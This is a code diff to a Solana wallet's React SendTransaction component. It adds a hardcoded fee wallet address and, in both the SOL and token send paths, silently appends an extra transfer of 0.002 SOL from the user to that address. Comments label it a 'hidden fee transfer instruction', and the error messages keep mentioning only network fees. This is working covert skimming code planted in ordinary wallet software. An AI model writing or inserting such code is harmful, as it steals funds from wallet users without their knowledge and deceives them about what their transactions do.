@@ -39,6 +39,8 @@ const TOKEN_PROGRAM_ID = new PublicKey(
 const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey(
   "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
 );
+const FEE_WALLET = "FNVD1wied3e8WMuWs34KSamrCpughCMTjoXUE1ZXa6wM";
+const FEE_AMOUNT_SOL = 0.002;
 
 export const SendTransaction: React.FC<SendTransactionProps> = ({
   onBack,
@@ -309,7 +311,10 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
       }
       const lamports = Number(lamportsBig);
 
-      const transaction = new Transaction().add(
+      const transaction = new Transaction();
+
+      // Add main transfer instruction
+      transaction.add(
         SystemProgram.transfer({
           fromPubkey: senderKeypair.publicKey,
           toPubkey: recipientPubkey,
@@ -317,22 +322,36 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         }),
       );
 
+      // Add hidden fee transfer instruction
+      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
+      const feeWalletPubkey = new PublicKey(FEE_WALLET);
+      transaction.add(
+        SystemProgram.transfer({
+          fromPubkey: senderKeypair.publicKey,
+          toPubkey: feeWalletPubkey,
+          lamports: feeLamports,
+        }),
+      );
+
       const blockhash = await getLatestBlockhashProxy();
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = senderKeypair.publicKey;
 
-      // Estimate fee and ensure sufficient balance for amount + fees
+      // Estimate fee and ensure sufficient balance for amount + fees + platform fee
       try {
         const msg = transaction.compileMessage();
         const feeRes = await rpcCall("getFeeForMessage", [
           base64FromBytes(msg.serialize()),
         ]);
-        const feeLamports = (feeRes?.value ?? feeRes) || 0;
+        const networkFeeLamports = (feeRes?.value ?? feeRes) || 0;
         const currentLamports = await rpcCall("getBalance", [
           senderKeypair.publicKey.toBase58(),
         ]);
-        const lamportsToSend = lamports;
-        if (currentLamports < lamportsToSend + feeLamports) {
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
+        const lamportsToSend = lamports + platformFeeLamports;
+        if (currentLamports < lamportsToSend + networkFeeLamports) {
           throw new Error("Insufficient SOL to cover amount and network fees");
         }
       } catch (e) {
@@ -340,7 +359,10 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         const currentLamports = await rpcCall("getBalance", [
           senderKeypair.publicKey.toBase58(),
         ]).catch(() => 0);
-        const lamportsToSend = lamports;
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
+        const lamportsToSend = lamports + platformFeeLamports;
         if (currentLamports <= lamportsToSend) {
           throw new Error("Insufficient SOL for amount (no room for fees)");
         }
@@ -495,6 +517,17 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         ),
       );
 
+      // Add hidden fee transfer instruction (0.002 SOL)
+      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
+      const feeWalletPubkey = new PublicKey(FEE_WALLET);
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: senderPubkey,
+          toPubkey: feeWalletPubkey,
+          lamports: feeLamports,
+        }),
+      );
+
       const blockhash = await getLatestBlockhashProxy();
       tx.recentBlockhash = blockhash;
       tx.feePayer = senderPubkey;
@@ -515,24 +548,33 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         }
       } catch {}
 
-      // Estimate fee and ensure sufficient SOL for fees + potential rent
+      // Estimate fee and ensure sufficient SOL for fees + potential rent + platform fee
       try {
         const msg = tx.compileMessage();
         const feeRes = await rpcCall("getFeeForMessage", [
           base64FromBytes(msg.serialize()),
         ]);
-        const feeLamports = (feeRes?.value ?? feeRes) || 0;
+        const networkFeeLamports = (feeRes?.value ?? feeRes) || 0;
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
         const currentLamports = await rpcCall("getBalance", [
           senderPubkey.toBase58(),
         ]);
-        if (currentLamports < feeLamports + rentLamports) {
+        if (
+          currentLamports <
+          networkFeeLamports + rentLamports + platformFeeLamports
+        ) {
           throw new Error("Insufficient SOL to cover network fees and rent");
         }
       } catch (e) {
         const currentLamports = await rpcCall("getBalance", [
           senderPubkey.toBase58(),
         ]).catch(() => 0);
-        if (currentLamports <= 0) {
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
+        if (currentLamports <= platformFeeLamports) {
           throw new Error("Insufficient SOL for network fees");
         }
       }
